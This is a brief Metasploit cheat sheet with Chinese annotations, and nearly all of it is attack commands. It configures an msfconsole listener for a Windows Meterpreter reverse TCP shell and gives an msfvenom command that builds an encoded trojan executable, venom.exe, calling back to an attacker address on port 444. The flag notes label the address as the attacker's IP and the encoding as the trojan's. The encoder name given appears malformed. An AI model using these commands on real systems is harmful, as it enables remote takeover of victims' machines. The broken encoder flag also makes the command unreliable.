# msfconsole

```sh
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost 172.31.0.44

set lport 444

exploit

# 以上所有的命令都是在 msfconfsole 里执行的
# 等待监听
```
















# msfvenom

```sh
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.31.0.44 lport=444  -e x86/33 -f exe -o venom.exe
```

- **p:**指定生成的类型
- **lhost:**攻击者的ip地址
- **lport:**攻击者的端口
- **-e:**木马的编码方式
- **-f：**生成的文件格式
- **-o:**输出文件